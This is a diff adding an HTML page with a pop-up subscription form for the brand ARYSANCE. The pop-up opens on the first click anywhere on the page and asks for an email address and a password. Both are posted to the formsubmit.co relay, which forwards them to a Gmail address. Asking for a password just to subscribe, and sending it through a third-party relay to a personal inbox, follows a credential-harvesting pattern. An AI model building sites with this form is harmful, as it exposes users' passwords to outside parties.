@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pop-up Subscription</title>
+    <style>
+        /* Include the Dream Avenue font */
+        @font-face {
+            font-family: 'Dream Avenue';
+            src: url('path/to/dream-avenue.woff2') format('woff2'),
+                 url('path/to/dream-avenue.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        /* Modal styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1000; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+        }
+
+        .modal-content {
+            background: url('IMG_1579(1)(1).png') no-repeat center center; /* Background image */
+            background-size: cover; /* Cover the entire modal */
+            color: #fff; /* White text color for contrast */
+            margin: 15% auto; /* 15% from the top and centered */
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%; /* Could be more or less, depending on screen size */
+            border-radius: 8px; /* Rounded corners */
+        }
+
+        .close {
+            color: #fff; /* White color for the close button */
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: #ddd; /* Light gray color on hover */
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        /* Style the form inside the modal */
+        #subscription-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        #subscription-form label {
+            margin: 10px 0 5px;
+        }
+
+        #subscription-form input[type="email"],
+        #subscription-form input[type="password"] {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        #subscription-form input[type="submit"] {
+            background-color: #333;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        #subscription-form input[type="submit"]:hover {
+            background-color: #555;
+        }
+
+        /* Success message styles */
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            font-size: 18px;
+            color: #4CAF50;
+        }
+
+        /* Custom font style for ARYSANCE */
+        .brand-name {
+            font-family: 'Dream Avenue', sans-serif;
+            font-size: 24px;
+            color: #fff; /* White text color for contrast */
+        }
+    </style>
+</head>
+<body>
+
+<!-- Subscription Modal -->
+<div id="subscription-modal" class="modal">
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <div id="form-section">
+            <h2>Subscribe to <span class="brand-name">ARYSANCE</span></h2>
+            <form id="subscription-form" action="https://formsubmit.co/arysance@gmail.com" method="POST">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required>
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+                <input type="submit" value="Subscribe">
+            </form>
+        </div>
+        <div id="success-message" class="success-message">
+            Congratulations!! Welcome to <span class="brand-name">ARYSANCE</span> family.
+        </div>
+    </div>
+</div>
+
+<script>
+    // JavaScript for handling the subscription modal
+    var modal = document.getElementById("subscription-modal");
+    var span = document.getElementsByClassName("close")[0];
+    var formSection = document.getElementById("form-section");
+    var successMessage = document.getElementById("success-message");
+
+    // Show modal on the first click anywhere on the page
+    var hasClicked = false;
+    document.addEventListener('click', function() {
+        if (!hasClicked) {
+            modal.style.display = "block";
+            hasClicked = true;
+        }
+    });
+
+    // When the user clicks on <span> (x), close the modal
+    span.onclick = function() {
+        modal.style.display = "none";
+    }
+
+    // When the user clicks anywhere outside of the modal, close it
+    window.onclick = function(event) {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    }
+
+    // Handle form submission
+    document.getElementById("subscription-form").onsubmit = function(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        // Hide the form and show the success message
+        formSection.style.display = "none";
+        successMessage.style.display = "block";
+
+        // Automatically close the modal after 1 minute
+        setTimeout(function() {
+            modal.style.display = "none";
+        }, 60000); // 60000 milliseconds = 1 minute
+
+        // Optionally, you can still submit the form to FormSubmit
+        // If you are using FormSubmit or any other form handling service, the form submission will be handled automatically
+        this.submit();
+    }
+</script>
+
+</body>
+</html>
